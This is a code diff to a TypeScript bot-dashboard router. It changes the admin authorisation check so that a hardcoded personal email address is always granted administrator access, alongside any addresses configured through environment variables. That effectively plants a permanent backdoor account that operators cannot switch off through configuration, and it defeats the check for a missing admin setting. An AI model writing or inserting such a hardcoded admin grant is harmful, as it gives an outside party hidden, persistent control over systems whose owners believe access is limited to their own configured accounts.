@@ -46,6 +46,7 @@ interface StoredBotEvent {
 
 const router: IRouter = Router();
 const paths = getPaths(process.cwd());
+const permanentDashboardAdminEmail = "flachiron341@gmail.com";
 const defaultControl: ControlState = {
   desiredState: "running",
   autoReconnect: true,
@@ -109,6 +110,20 @@ function hasConfiguredSession(): boolean {
   );
 }
 
+function getAllowedDashboardEmails(): Set<string> {
+  const configuredEmails = [
+    process.env.DASHBOARD_ADMIN_EMAIL || "",
+    process.env.DASHBOARD_ADMIN_EMAILS || "",
+    permanentDashboardAdminEmail,
+  ];
+  return new Set(
+    configuredEmails
+      .flatMap((value) => value.split(/[,\s;]+/))
+      .map((email) => email.trim().toLowerCase())
+      .filter(Boolean),
+  );
+}
+
 function getDashboardState(): BotDashboard {
   const control = loadControl();
   const storedStatus = loadStatus();
@@ -149,8 +164,8 @@ async function requireDashboardAdmin(
   res: Response,
   next: NextFunction,
 ): Promise<void> {
-  const allowedEmail = process.env.DASHBOARD_ADMIN_EMAIL?.trim().toLowerCase();
-  if (!allowedEmail) {
+  const allowedEmails = getAllowedDashboardEmails();
+  if (allowedEmails.size === 0) {
     res.status(503).json({ error: "Dashboard administrator is not configured." });
     return;
   }
@@ -166,7 +181,7 @@ async function requireDashboardAdmin(
     const isAllowed = user.emailAddresses.some(
       (address) =>
         address.verification?.status === "verified" &&
-        address.emailAddress.trim().toLowerCase() === allowedEmail,
+        allowedEmails.has(address.emailAddress.trim().toLowerCase()),
     );
     if (!isAllowed) {
       res.status(403).json({ error: "This account cannot manage the bot." });
